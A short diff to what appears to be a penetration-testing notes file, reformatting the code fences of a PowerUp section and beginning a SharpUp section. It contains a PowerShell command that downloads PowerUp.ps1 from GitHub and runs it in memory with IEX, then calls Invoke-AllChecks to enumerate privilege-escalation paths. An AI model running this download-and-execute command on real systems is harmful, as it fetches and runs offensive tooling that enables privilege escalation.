@@ -1,9 +1,8 @@
 # PowerUp
-`
+```
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
-
 Invoke-AllChecks
-`
+```
 
 # SharpUp
 `
